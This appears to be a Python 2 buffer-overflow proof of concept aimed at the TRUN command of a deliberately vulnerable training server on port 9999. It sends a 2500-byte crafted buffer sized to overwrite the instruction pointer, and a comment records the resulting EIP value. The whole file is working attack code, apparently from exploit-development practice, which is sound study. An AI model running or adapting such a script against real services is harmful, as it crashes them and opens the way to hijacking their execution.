#!/usr/bin/python

'''
Valid Commands:
HELP
STATS [stat_value]
RTIME [rtime_value]
LTIME [ltime_value]
SRUN [srun_value]
TRUN [trun_value]
GMON [gmon_value]
GDOG [gdog_value]
KSTET [kstet_value]
GTER [gter_value]
HTER [hter_value]
LTER [lter_value]
KSTAN [lstan_value]
EXIT
'''

import time, struct, sys
import socket as so

try:
    server = sys.argv[1]
    port = 9999
except IndexError:
    print "[+] Usage %s host" % sys.argv[0]
    sys.exit()

buffer = 'A' * 2006 + 'B' * 4 + 'C' * (2500-2006-4)

req1 = "TRUN ." + buffer
s = so.socket(so.AF_INET, so.SOCK_STREAM)
try:
     s.connect((server, port))
     print repr(s.recv(1024))
     s.send(req1)
     print repr(s.recv(1024))
except:
     print "[!] connection refused, check debugger"
s.close()

## Result
## EIP = 396F4338